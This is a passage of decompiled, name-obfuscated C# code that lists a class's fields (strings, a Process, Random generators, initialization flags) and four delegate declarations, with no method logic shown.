		// Token: 0x040000EF RID: 239
		public object object_1;

		// Token: 0x040000F0 RID: 240
		public object object_2;

		// Token: 0x040000F1 RID: 241
		public object object_3;

		// Token: 0x040000F2 RID: 242
		public object object_4;

		// Token: 0x040000F3 RID: 243
		public object object_5;

		// Token: 0x040000F4 RID: 244
		public object object_6;

		// Token: 0x040000F5 RID: 245
		private string string_2;

		// Token: 0x040000F6 RID: 246
		private string string_3;

		// Token: 0x040000F7 RID: 247
		private string string_4;

		// Token: 0x040000F8 RID: 248
		private string string_5;

		// Token: 0x040000F9 RID: 249
		private string string_6;

		// Token: 0x040000FA RID: 250
		private string string_7;

		// Token: 0x040000FB RID: 251
		private string string_8;

		// Token: 0x040000FC RID: 252
		private string string_9;

		// Token: 0x040000FD RID: 253
		private string string_10;

		// Token: 0x040000FE RID: 254
		private string string_11;

		// Token: 0x040000FF RID: 255
		private string string_12;

		// Token: 0x04000100 RID: 256
		private string string_13;

		// Token: 0x04000101 RID: 257
		private string string_14;

		// Token: 0x04000102 RID: 258
		private string string_15;

		// Token: 0x04000103 RID: 259
		private string string_16;

		// Token: 0x04000104 RID: 260
		private string string_17;

		// Token: 0x04000105 RID: 261
		private string string_18;

		// Token: 0x04000106 RID: 262
		private string string_19;

		// Token: 0x04000107 RID: 263
		private string string_20;

		// Token: 0x04000108 RID: 264
		private string string_21;

		// Token: 0x04000109 RID: 265
		private string string_22;

		// Token: 0x0400010A RID: 266
		private string string_23;

		// Token: 0x0400010B RID: 267
		private string string_24;

		// Token: 0x0400010C RID: 268
		private string string_25;

		// Token: 0x0400010D RID: 269
		private string string_26;

		// Token: 0x0400010E RID: 270
		private string string_27;

		// Token: 0x0400010F RID: 271
		private string string_28;

		// Token: 0x04000110 RID: 272
		private string string_29;

		// Token: 0x04000111 RID: 273
		private string string_30;

		// Token: 0x04000112 RID: 274
		private string string_31;

		// Token: 0x04000113 RID: 275
		private string string_32;

		// Token: 0x04000114 RID: 276
		private string string_33;

		// Token: 0x04000115 RID: 277
		private string string_34;

		// Token: 0x04000116 RID: 278
		private string string_35;

		// Token: 0x04000117 RID: 279
		private string string_36;

		// Token: 0x04000118 RID: 280
		private int int_0;

		// Token: 0x04000119 RID: 281
		private int int_1;

		// Token: 0x0400011A RID: 282
		private List<string> strings_0;

		// Token: 0x0400011B RID: 283
		public string string_40;

		// Token: 0x0400011C RID: 284
		public string string_37;

		// Token: 0x0400011D RID: 285
		private string string_38;

		// Token: 0x0400011E RID: 286
		public string string_39;

		// Token: 0x0400011F RID: 287
		private Process process_0;

		// Token: 0x04000120 RID: 288
		private bool bool_4;

		// Token: 0x04000121 RID: 289
		private bool bool_5;

		// Token: 0x04000122 RID: 290
		public Random random_0;

		// Token: 0x04000123 RID: 291
		public bool bool_6;

		// Token: 0x04000124 RID: 292
		private int int_2;

		// Token: 0x04000125 RID: 293
		private Random random_1;

		// Token: 0x04000126 RID: 294
		private StaticLocalInitFlag staticLocalInitFlag_0;

		// Token: 0x04000127 RID: 295
		private Random random_2;

		// Token: 0x04000128 RID: 296
		private StaticLocalInitFlag staticLocalInitFlag_1;

		// Token: 0x04000129 RID: 297
		private Random random_3;

		// Token: 0x0400012A RID: 298
		private StaticLocalInitFlag staticLocalInitFlag_2;

		// Token: 0x0200002A RID: 42
		// (Invoke) Token: 0x06000326 RID: 806
		public delegate void GDelegate0(object[] objects_0);

		// Token: 0x0200002B RID: 43
		// (Invoke) Token: 0x0600032A RID: 810
		public delegate void GDelegate1(object[] objects_0);

		// Token: 0x0200002C RID: 44
		// (Invoke) Token: 0x0600032E RID: 814
		public delegate void GDelegate2(object[] objects_0);

		// Token: 0x0200002D RID: 45
		// (Invoke) Token: 0x06000332 RID: 818
		public delegate void GDelegate3(object object_0, object object_1);
	}
}
